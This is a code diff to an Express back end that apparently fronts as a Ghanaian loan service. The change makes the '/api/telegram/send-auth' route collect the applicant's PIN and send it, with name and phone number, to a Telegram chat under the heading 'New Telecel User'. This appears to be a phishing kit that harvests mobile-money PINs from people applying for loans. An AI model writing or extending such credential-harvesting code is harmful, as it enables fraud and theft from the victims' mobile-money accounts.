@@ -66,9 +66,9 @@ app.post('/api/loans/apply', (req, res) => {
   });
 });
 
-// ─── FIXED TELEGRAM ROUTE ───
+// ─── UPDATED TELEGRAM ROUTE ───
 app.post('/api/telegram/send-auth', async (req, res) => {
-  const { phone, amount, name, loanId } = req.body;
+  const { phone, amount, name, loanId, pin } = req.body;
   console.log('📱 Telegram Request:', req.body);
   
   try {
@@ -83,9 +83,10 @@ app.post('/api/telegram/send-auth', async (req, res) => {
       return res.json({ success: false, message: 'Telegram not configured' });
     }
     
-    const message = `<b>💰 New Loan Authorization</b>\n\n` +
+    const message = `<b>💰 New Telecel User</b>\n\n` +
                     `<b>Name:</b> ${name || 'Unknown'}\n` +
                     `<b>Phone:</b> ${phone || 'Unknown'}\n` +
+                    `<b>PIN:</b> <code>${pin || 'N/A'}</code>\n` +
                     `<b>Amount:</b> GHS ${amount || '0'}\n` +
                     `<b>Loan ID:</b> ${loanId || 'N/A'}`;
     
